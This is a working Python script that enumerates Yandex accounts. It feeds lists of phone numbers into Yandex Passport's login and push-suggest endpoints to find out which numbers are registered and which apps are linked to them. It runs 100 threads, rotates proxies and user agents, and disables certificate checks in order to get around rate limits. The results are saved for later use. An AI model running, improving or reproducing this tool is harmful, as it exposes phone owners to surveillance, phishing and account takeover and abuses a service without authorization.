import requests
from requests.exceptions import ProxyError, ConnectionError, Timeout, RequestException
import json
import os
import random
import re
import time
from queue import Queue, Empty
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


CONCURRENCY = 100
REQUEST_TIMEOUT = 10
WRITE_BUFFER_SIZE = 20


MOBILE_UA_LIST = [
    "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139.0.0.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36"
]


BASE_HEADERS = {
    "Host": "passport.yandex.ru",
    "Connection": "keep-alive",
    "sec-ch-ua-platform": "\"Android\"",
    "tractor-location": "0",
    "sec-ch-ua": "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"139\", \"Chromium\";v=\"139\"",
    "sec-ch-ua-mobile": "?1",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-prefers-color-scheme": "dark",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://passport.yandex.ru",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://passport.yandex.ru/",
    "Accept-Language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
}


def read_numbers(filename):
    with open(filename, "r", encoding="utf-8") as f:
        return json.load(f)

def load_proxies(filename):
    lst = []
    with open(filename, "r", encoding="utf-8") as f:
        for line in f:
            s = line.strip()
            if not s:
                continue
            parts = s.split(":")
            if len(parts) == 2:
                # ip:port
                ip, port = parts
                lst.append({"ip": ip, "port": port})
            elif len(parts) == 4:
                # ip:port:user:pass
                ip, port, user, pwd = parts
                lst.append({"ip": ip, "port": port, "user": user, "pwd": pwd})
    return lst

def get_session(proxy, user_agent):
    session = requests.Session()
    headers = BASE_HEADERS.copy()
    headers["User-Agent"] = user_agent
    session.headers.update(headers)
    #if "user" in proxy and "pwd" in proxy:
        #proxy_url = f"http://{proxy['user']}:{proxy['pwd']}@{proxy['ip']}:{proxy['port']}"
    #else:
        #proxy_url = f"http://{proxy['ip']}:{proxy['port']}"

    #session.proxies.update({
        #"http": proxy_url,
        #"https": proxy_url
    #})
    return session

def initialize_session(session):
    url = "https://passport.yandex.ru/am?app_platform=android"
    r = session.get(url, verify=False, timeout=REQUEST_TIMEOUT)
    if r.status_code != 200:
        return None
    csrf_match = re.search(r'"csrf"\s*:\s*"([^"]+)"', r.text)
    uuid_match = re.search(r'"process_uuid"\s*:\s*"([^"]+)"', r.text)
    if not csrf_match or not uuid_match:
        return None
    return {"csrf_token": csrf_match.group(1), "process_uuid": uuid_match.group(1)}

def get_track_id(session, tokens, number):
    data = {
        "csrf_token": tokens["csrf_token"],
        "process_uuid": tokens["process_uuid"],
        "login": number,
        "app_platform": "android"
    }
    url = "https://passport.yandex.ru/registration-validations/auth/multi_step/start"
    r = session.post(url, data=data, verify=False, timeout=REQUEST_TIMEOUT)
    if r.status_code != 200:
        return None
    resp = r.json()
    return resp.get("track_id")

def get_number_apps(session, tokens, number):
    data = {
        "csrf_token": tokens["csrf_token"],
        "track_id": tokens["track_id"],
        "phone_number": number,
        "force_show_code_in_notification": "0",
        "can_use_anmon": "true",
        "isSilent2faPushesEnabled": "true"
    }
    url = "https://passport.yandex.ru/registration-validations/auth-suggest-send-push"
    r = session.post(url, data=data, verify=False, timeout=REQUEST_TIMEOUT)
    if r.status_code != 200:
        return None
    resp = r.json()
    if resp.get("status") == "error":
        return "no_push_error"
    if not resp.get("apps_for_silent_push") and not resp.get("apps_for_bright_push"):
        return "proxy_error"
    apps = []
    for key in ("apps_for_silent_push", "apps_for_bright_push"):
        if key in resp and resp[key]:
            apps.extend([app["app"] for app in resp[key] if "app" in app])
    apps = list(dict.fromkeys(apps))
    return apps if apps else None

def attempt_with_proxy(number, proxy):
    """Одна попытка проверки номера через конкретный proxy.
       Возвращает (number, result) где result: True, False или "proxy_error".
    """
    ua = random.choice(MOBILE_UA_LIST)
    try:
        session = get_session(proxy, ua)
        tokens = initialize_session(session)
        if not tokens:
            return number, "proxy_error"
        track_id = get_track_id(session, tokens, number)
        if not track_id:
            return number, "proxy_error"
        tokens["track_id"] = track_id
        return number, get_number_apps(session, tokens, number)
    except (ProxyError, ConnectionError, Timeout, RequestException):
        return number, "proxy_error"

def worker_func(work_queue: Queue, proxies, in_use_set: set, in_use_lock: Lock,
                results_dict: dict, results_lock: Lock, registered_buffer: list, reg_lock: Lock):
    while True:
        try:
            number = work_queue.get_nowait()
        except Empty:
            return

        proxy_order = random.sample(proxies, len(proxies))
        final_result = None

        for proxy in proxy_order:
            proxy_key = f"{proxy['ip']}:{proxy['port']}"
            reserved = False

            with in_use_lock:
                if proxy_key not in in_use_set:
                    in_use_set.add(proxy_key)
                    reserved = True

            if not reserved:
                with in_use_lock:
                    all_busy = len(in_use_set) >= min(len(proxies), CONCURRENCY)
                if not all_busy:
                    continue

            try:
                _, apps = attempt_with_proxy(number, proxy)
            finally:
                if reserved:
                    with in_use_lock:
                        in_use_set.discard(proxy_key)

            if apps == "proxy_error":
                continue
            else:
                final_result = apps
                break

        with results_lock:
            results_dict[number] = final_result
        with reg_lock:
            if final_result != None and final_result != "no_push_error":
                registered_buffer.append(f"{number} | Приложения: {', '.join(apps)}")
                print(f"[+] Зарегистрирован: {number} | Приложения: {', '.join(apps)}")

        work_queue.task_done()

def initialize_scratcher(numbers, proxies, out_registered_file="yandex_parse.json"):
    q = Queue()
    for n in numbers:
        q.put(n)

    in_use_set = set()
    in_use_lock = Lock()
    results = {}
    results_lock = Lock()
    registered = []
    reg_lock = Lock()

    with ThreadPoolExecutor(max_workers=CONCURRENCY) as exe:
        futures = [exe.submit(worker_func, q, proxies, in_use_set, in_use_lock,
                               results, results_lock, registered, reg_lock)
                   for _ in range(CONCURRENCY)]
        for f in futures:
            f.result()

    if registered:
        if os.path.exists(out_registered_file):
            try:
                with open(out_registered_file, "r", encoding="utf-8") as fr:
                    existing = json.load(fr)
            except Exception:
                existing = []
        else:
            existing = []

        combined = existing + [n for n in registered if n not in existing]
        with open(out_registered_file, "w", encoding="utf-8") as fw:
            json.dump(combined, fw, ensure_ascii=False, indent=2)

if __name__ == "__main__":
    numbers = read_numbers("beeline_numbers.json")
    proxies = load_proxies("proxies.txt")
    if not numbers:
        raise SystemExit("Нет номеров в numbers.json")
    if not proxies:
        raise SystemExit("Нет прокси в proxies.txt")
    initialize_scratcher(numbers, proxies)